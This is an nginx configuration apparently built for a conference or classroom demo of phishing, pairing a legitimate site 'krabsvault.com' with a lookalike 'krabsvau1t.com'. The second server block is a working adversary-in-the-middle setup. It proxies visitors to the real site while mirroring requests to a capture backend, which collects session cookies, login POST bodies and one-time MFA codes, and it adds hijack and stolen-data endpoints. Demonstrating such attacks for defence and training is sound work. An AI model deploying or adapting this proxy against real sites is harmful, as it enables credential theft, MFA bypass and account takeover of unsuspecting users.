events {}

http {
  # KrabsVault = legitimate website
  server {
    listen 443 ssl;
    server_name krabsvault.com;

    ssl_certificate     /etc/nginx/certs/krabsvault.com.pem;
    ssl_certificate_key /etc/nginx/certs/krabsvault.com-key.pem;

    # Fonts are referenced via absolute krabsvault.com URLs, so when the page is
    # served on the phishing origin the woff2 fetches are cross-origin. Web fonts
    # are always fetched in CORS mode, so advertise CORS to let them load.
    location /static/fonts/ {
      add_header Access-Control-Allow-Origin "*" always;
      proxy_pass http://host.containers.internal:8000;
      proxy_set_header Host $host;
      proxy_set_header X-Forwarded-Proto $scheme;
    }

    # The slide deck (served by Vite on localhost) fetches the live security
    # level to drive the password/MFA/passkey demo. That is a cross-origin call,
    # so advertise CORS here. The endpoint is session-dependent, so we cannot use
    # a wildcard origin with credentials: reflect the caller's Origin and allow
    # credentials, and answer the preflight ourselves.
    location = /api/security-level {
      if ($request_method = OPTIONS) {
        add_header Access-Control-Allow-Origin $http_origin always;
        add_header Access-Control-Allow-Credentials "true" always;
        add_header Access-Control-Allow-Methods "GET, OPTIONS" always;
        add_header Access-Control-Allow-Headers "Content-Type" always;
        add_header Access-Control-Max-Age 86400 always;
        add_header Content-Length 0;
        add_header Content-Type "text/plain" always;
        return 204;
      }

      add_header Access-Control-Allow-Origin $http_origin always;
      add_header Access-Control-Allow-Credentials "true" always;

      proxy_pass http://host.containers.internal:8000;
      proxy_set_header Host $host;
      proxy_set_header X-Forwarded-Proto $scheme;
    }

    location / {
      proxy_pass http://host.containers.internal:8000;
      proxy_http_version 1.1;
      proxy_set_header Host $host;
      proxy_set_header X-Forwarded-Proto $scheme;
      proxy_set_header Upgrade $http_upgrade;
      proxy_set_header Connection "upgrade";
    }
  }

  # KrabsVau1t = Phishing website
  server {
    listen 443 ssl;
    server_name krabsvau1t.com;

    ssl_certificate     /etc/nginx/certs/krabsvau1t.com.pem;
    ssl_certificate_key /etc/nginx/certs/krabsvau1t.com-key.pem;

    # Simple trick for the demo: all the trafic to the phishing site is redirected to the legit one
    location / {
      proxy_pass http://host.containers.internal:8000;
      proxy_http_version 1.1;
      proxy_set_header Host krabsvault.com;
      proxy_set_header X-Forwarded-Proto $scheme;
      proxy_set_header Upgrade $http_upgrade;
      proxy_set_header Connection "upgrade";
    }

    # But all requests are mirrored to a capture endpoint to steal the session cookie
    location = / {
      mirror /capture;
      proxy_pass http://host.containers.internal:8000;
      proxy_http_version 1.1;
      proxy_set_header Host krabsvault.com;
      proxy_set_header X-Forwarded-Proto $scheme;
    }

    # Avoid actual endpoints from the phishing app to be redirected to the legit one.
    # Used by the GET / mirror to steal the session cookie. nginx keeps the visitor's
    # request open until this subrequest finishes, so we short-circuit when there is
    # no session cookie to steal (logged out, or before login) instead of stalling
    # the visitor on a pointless round-trip to the phishing backend.
    location = /capture {
      internal;
      if ($cookie_session = "") {
        return 204;
      }
      proxy_pass http://host.containers.internal:8666/capture;
      proxy_set_header Host $host;
      proxy_set_header X-Original-URI $request_uri;
    }

    # Used by the /login and /login/mfa/totp mirrors. Only the credential-bearing
    # POST is worth stealing; the GET that renders the login page (e.g. right after
    # logout) would otherwise stall the visitor for nothing.
    location = /capture-credentials {
      internal;
      if ($request_method != POST) {
        return 204;
      }
      proxy_pass http://host.containers.internal:8666/capture;
      proxy_set_header Host $host;
      proxy_set_header X-Original-URI $request_uri;
    }
    
    location = /hijack {
      proxy_pass http://host.containers.internal:8666/hijack;
      proxy_set_header Host $host;
      proxy_set_header X-Forwarded-Proto $scheme;
    }

    location /stolen {
      proxy_pass http://host.containers.internal:8666;
      proxy_set_header Host $host;
      proxy_set_header X-Forwarded-Proto $scheme;
      proxy_http_version 1.1;
      proxy_set_header Upgrade $http_upgrade;
      proxy_set_header Connection "upgrade";
    }

    location = /login {
      # 1. Steal the login payload (POST only — see /capture-credentials)
      mirror /capture-credentials;
      mirror_request_body on;

      # 2. Pass the request to the legit website
      proxy_pass http://host.containers.internal:8000/login;
      proxy_http_version 1.1;
      proxy_set_header Host krabsvault.com;
      proxy_set_header X-Forwarded-Proto $scheme;
    }

    location = /login/mfa/totp {
      # MFA doesn't save you here: the one-time code is phishable too.
      # 1. Steal the TOTP code (the form also carries the username; POST only)
      mirror /capture-credentials;
      mirror_request_body on;

      # 2. Pass the request to the legit website
      proxy_pass http://host.containers.internal:8000/login/mfa/totp;
      proxy_http_version 1.1;
      proxy_set_header Host krabsvault.com;
      proxy_set_header X-Forwarded-Proto $scheme;
    }

  }
}